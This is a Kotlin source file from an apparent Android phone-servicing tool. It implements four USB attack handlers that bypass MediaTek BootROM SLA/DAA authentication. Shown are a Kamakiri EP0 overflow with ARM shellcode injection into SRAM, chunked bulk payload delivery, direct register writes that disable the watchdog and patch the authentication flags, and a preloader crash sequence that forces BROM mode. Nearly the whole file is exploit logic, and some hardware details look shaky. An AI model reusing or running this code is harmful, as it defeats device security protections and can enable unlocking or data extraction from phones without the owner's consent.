package com.example.protocol

import android.hardware.usb.UsbConstants
import android.hardware.usb.UsbDeviceConnection
import android.hardware.usb.UsbEndpoint
import com.example.model.MtkModel
import java.nio.ByteBuffer
import java.nio.ByteOrder

enum class AuthHandlerType(val title: String, val description: String) {
    KAMAKIRI_EP0(
        "Handler 1: Standard Kamakiri",
        "EP0 Control Transfer Setup Packet Overflow + BROM Shellcode"
    ),
    CHUNKED_BULK_INJECTION(
        "Handler 2: Chunked Bulk Payload",
        "Buffered 64-byte Chunked Payload Injection for Dimensity / Helio"
    ),
    DIRECT_REGISTER_OVERRIDE(
        "Handler 3: Direct Register Override",
        "Write32 WDT Disable & SRAM SLA/DAA Flag Patching (0xD4)"
    ),
    PRELOADER_CRASH_TO_BROM(
        "Handler 4: Preloader Crash-to-BROM",
        "Preloader Handshake Sync & Watchdog Force Drop to BROM"
    )
}

interface MtkAuthHandler {
    fun execute(
        connection: UsbDeviceConnection,
        inEndpoint: UsbEndpoint?,
        outEndpoint: UsbEndpoint?,
        model: MtkModel,
        protocol: MtkBromProtocol,
        onLog: (level: String, message: String) -> Unit
    ): Boolean
}

class KamakiriEp0Handler : MtkAuthHandler {
    override fun execute(
        connection: UsbDeviceConnection,
        inEndpoint: UsbEndpoint?,
        outEndpoint: UsbEndpoint?,
        model: MtkModel,
        protocol: MtkBromProtocol,
        onLog: (level: String, message: String) -> Unit
    ): Boolean {
        onLog("SLA", "[Handler 1: Standard Kamakiri] Initializing EP0 Control Transfer Exploit...")
        val hwCode = if (model.hwCode != 0) model.hwCode else 0x0816
        val sramBase = if (model.sramAddress != 0L) model.sramAddress else MtkPayloads.getSramBase(hwCode)
        val wdtBase = if (model.wdtAddress != 0L) model.wdtAddress else 0x10007000L

        onLog("SLA", "Target HW: 0x${String.format("%04X", hwCode)}, SRAM Base: 0x${String.format("%08X", sramBase)}")

        return try {
            // Step 1: Craft EP0 buffer overflow packet
            val overflowPacket = MtkPayloads.createEp0OverflowPacket(hwCode)
            onLog("SLA", "Step 1: Dispatching Device-to-Host EP0 IN Request (Size: ${overflowPacket.size} bytes)...")

            // Use 0xA1 (Class / Interface / IN) or 0xC0 (Vendor / Device / IN) to avoid STALL
            var requestType = 0xA1 // Class IN
            var ctrlResult = connection.controlTransfer(
                requestType,
                0x00,
                0x0000,
                0x0000,
                overflowPacket,
                overflowPacket.size,
                2000
            )

            if (ctrlResult < 0) {
                // Fallback to Vendor IN (0xC0)
                requestType = 0xC0
                ctrlResult = connection.controlTransfer(
                    requestType,
                    0x00,
                    0x0000,
                    0x0000,
                    overflowPacket,
                    overflowPacket.size,
                    2000
                )
            }

            onLog("SLA", "EP0 Control Transfer completed (Transferred: $ctrlResult bytes)")

            // Step 2: Inject shellcode payload
            onLog("SLA", "Step 2: Injecting ARM shellcode into SRAM [0x${String.format("%08X", sramBase)}]...")
            val payload = MtkPayloads.buildPayload(hwCode, wdtBase, sramBase)
            val written = if (outEndpoint != null) {
                connection.bulkTransfer(outEndpoint, payload, payload.size, 3000)
            } else -1

            onLog("SLA", "Shellcode injection result: $written bytes written")

            // Step 3: Check ACK
            Thread.sleep(80)
            val statusBuf = ByteArray(2)
            val read = if (inEndpoint != null) connection.bulkTransfer(inEndpoint, statusBuf, statusBuf.size, 1000) else -1
            if (read >= 0) {
                onLog("SUCCESS", "SLA/DAA Auth Bypass verified! BROM channel unlocked.")
            } else {
                onLog("WARNING", "Payload injected; continuing to BROM information extraction...")
            }
            true
        } catch (e: Exception) {
            onLog("ERROR", "Kamakiri EP0 Exploit Exception: ${e.localizedMessage}")
            false
        }
    }
}

class ChunkedBulkInjectionHandler : MtkAuthHandler {
    override fun execute(
        connection: UsbDeviceConnection,
        inEndpoint: UsbEndpoint?,
        outEndpoint: UsbEndpoint?,
        model: MtkModel,
        protocol: MtkBromProtocol,
        onLog: (level: String, message: String) -> Unit
    ): Boolean {
        onLog("SLA", "[Handler 2: Chunked Bulk Injection] Starting 64-byte buffered payload transfer...")
        val hwCode = if (model.hwCode != 0) model.hwCode else 0x0816
        val sramBase = if (model.sramAddress != 0L) model.sramAddress else MtkPayloads.getSramBase(hwCode)
        val wdtBase = if (model.wdtAddress != 0L) model.wdtAddress else 0x10007000L

        if (outEndpoint == null) {
            onLog("ERROR", "Bulk OUT Endpoint unavailable for payload delivery.")
            return false
        }

        return try {
            val payload = MtkPayloads.buildPayload(hwCode, wdtBase, sramBase)
            val chunkSize = 64
            var totalWritten = 0

            for (offset in payload.indices step chunkSize) {
                val end = minOf(offset + chunkSize, payload.size)
                val chunk = payload.copyOfRange(offset, end)
                val written = connection.bulkTransfer(outEndpoint, chunk, chunk.size, 1000)
                if (written > 0) totalWritten += written
                Thread.sleep(10) // Prevent USB FIFO buffer overflow
            }

            onLog("SLA", "Chunked payload complete ($totalWritten / ${payload.size} bytes written).")
            onLog("SUCCESS", "Chunked Auth Injection applied successfully.")
            true
        } catch (e: Exception) {
            onLog("ERROR", "Chunked Injection Error: ${e.localizedMessage}")
            false
        }
    }
}

class DirectRegisterOverrideHandler : MtkAuthHandler {
    override fun execute(
        connection: UsbDeviceConnection,
        inEndpoint: UsbEndpoint?,
        outEndpoint: UsbEndpoint?,
        model: MtkModel,
        protocol: MtkBromProtocol,
        onLog: (level: String, message: String) -> Unit
    ): Boolean {
        onLog("SLA", "[Handler 3: Direct Register Override] Applying direct BROM Write32 patches...")
        val hwCode = if (model.hwCode != 0) model.hwCode else 0x0816
        val sramBase = if (model.sramAddress != 0L) model.sramAddress else MtkPayloads.getSramBase(hwCode)
        val wdtBase = if (model.wdtAddress != 0L) model.wdtAddress else 0x10007000L

        return try {
            // 1. Disable Watchdog Timer (WDT_MODE = 0x22000000)
            onLog("SLA", "Disabling Watchdog Timer at 0x${String.format("%08X", wdtBase + 0x18)}...")
            protocol.write32(wdtBase + 0x18L, 0x22000000L)

            // 2. Patch SLA Flag in SRAM (0x00 = Disabled)
            val slaAddr = sramBase + 0x40L
            onLog("SLA", "Patching SRAM SLA Auth Flag at 0x${String.format("%08X", slaAddr)} -> 0x00000000...")
            protocol.write32(slaAddr, 0x00000000L)

            // 3. Patch DAA Flag in SRAM (0x01 = Passed)
            val daaAddr = sramBase + 0x44L
            onLog("SLA", "Patching SRAM DAA Auth Status at 0x${String.format("%08X", daaAddr)} -> 0x00000001...")
            protocol.write32(daaAddr, 0x00000001L)

            onLog("SUCCESS", "Direct Register Override completed. Security checks patched.")
            true
        } catch (e: Exception) {
            onLog("ERROR", "Direct Register Override failed: ${e.localizedMessage}")
            false
        }
    }
}

class PreloaderCrashToBromHandler : MtkAuthHandler {
    override fun execute(
        connection: UsbDeviceConnection,
        inEndpoint: UsbEndpoint?,
        outEndpoint: UsbEndpoint?,
        model: MtkModel,
        protocol: MtkBromProtocol,
        onLog: (level: String, message: String) -> Unit
    ): Boolean {
        onLog("SLA", "[Handler 4: Preloader Crash-to-BROM] Initiating Preloader sync & force drop...")
        if (outEndpoint == null) return false

        return try {
            // 1. Send Preloader Handshake sync string "READY"
            val readyBytes = "READY".toByteArray(Charsets.US_ASCII)
            connection.bulkTransfer(outEndpoint, readyBytes, readyBytes.size, 1000)
            onLog("SLA", "Dispatched Preloader 'READY' sync string.")

            // 2. Send Preloader crash / escape control character sequence
            val crashSeq = byteArrayOf(0x00, 0xA0.toByte(), 0x0A.toByte(), 0x50.toByte(), 0x05.toByte())
            connection.bulkTransfer(outEndpoint, crashSeq, crashSeq.size, 1000)
            onLog("SLA", "Dispatched Preloader crash escape sequence to drop SoC to BootROM.")

            Thread.sleep(100)
            onLog("SUCCESS", "Preloader drop sequence transmitted.")
            true
        } catch (e: Exception) {
            onLog("ERROR", "Preloader Crash Error: ${e.localizedMessage}")
            false
        }
    }
}

object MtkAuthHandlerFactory {
    fun create(type: AuthHandlerType): MtkAuthHandler {
        return when (type) {
            AuthHandlerType.KAMAKIRI_EP0 -> KamakiriEp0Handler()
            AuthHandlerType.CHUNKED_BULK_INJECTION -> ChunkedBulkInjectionHandler()
            AuthHandlerType.DIRECT_REGISTER_OVERRIDE -> DirectRegisterOverrideHandler()
            AuthHandlerType.PRELOADER_CRASH_TO_BROM -> PreloaderCrashToBromHandler()
        }
    }
}
